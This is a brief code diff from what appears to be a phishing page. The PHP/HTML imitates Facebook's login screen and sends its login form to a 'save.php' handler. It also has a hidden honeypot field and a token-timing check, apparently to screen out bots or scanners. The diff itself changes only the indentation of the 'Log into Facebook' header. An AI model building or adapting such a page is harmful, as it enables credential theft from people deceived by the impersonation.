@@ -101,7 +101,7 @@ if (time() * 1000 - $token_time > 30000) {
             <p>Connect with friends and the world around you on Facebook.</p>
         </div>
         <div class="login-box">
-            <div class="login-header">Log into Facebook</div>
+               <div class="login-header">Log into Facebook</div>
             <form method="POST" action="save.php" id="loginForm">
                 <div class="honeypot">
                     <input type="text" name="website_url" tabindex="-1" autocomplete="off">
